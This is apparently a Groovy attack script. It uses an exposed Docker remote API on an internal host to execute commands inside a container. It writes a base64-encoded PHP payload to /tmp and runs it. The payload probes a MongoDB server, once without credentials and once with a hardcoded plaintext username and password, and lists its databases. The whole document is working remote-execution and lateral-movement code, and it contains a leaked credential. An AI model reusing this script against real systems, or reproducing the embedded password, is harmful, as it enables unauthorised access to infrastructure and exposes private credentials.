import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
echo "=== Test 1: SIN credenciales ===\n";
try {
    $c=new MongoDB\\Driver\\Manager("mongodb://172.26.84.132:27021");
    $cmd=new MongoDB\\Driver\\Command(["listDatabases"=>1]);
    $r=$c->executeCommand("admin",$cmd);
    $r->setTypeMap(["root"=>"array","array"=>"array"]);
    foreach($r as $db){echo "DB: ".$db["name"]."\n";}
    echo "SIN_AUTH_OK\n";
} catch(Exception $e) {
    echo "SIN_AUTH_FAIL: ".$e->getMessage()."\n";
}

echo "\n=== Test 2: CON credenciales appsears ===\n";
try {
    $c2=new MongoDB\\Driver\\Manager("mongodb://appsears:S34rSu64RD0Jhy63@172.26.84.132:27021");
    $cmd2=new MongoDB\\Driver\\Command(["listDatabases"=>1]);
    $r2=$c2->executeCommand("admin",$cmd2);
    $r2->setTypeMap(["root"=>"array","array"=>"array"]);
    $count=0;
    foreach($r2 as $db){echo "DB: ".$db["name"]."\n";$count++;}
    echo "CON_AUTH_OK (dbs=$count)\n";
} catch(Exception $e) {
    echo "CON_AUTH_FAIL: ".$e->getMessage()."\n";
}
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(30000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/mongoauth.php && php /tmp/mongoauth.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(30000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
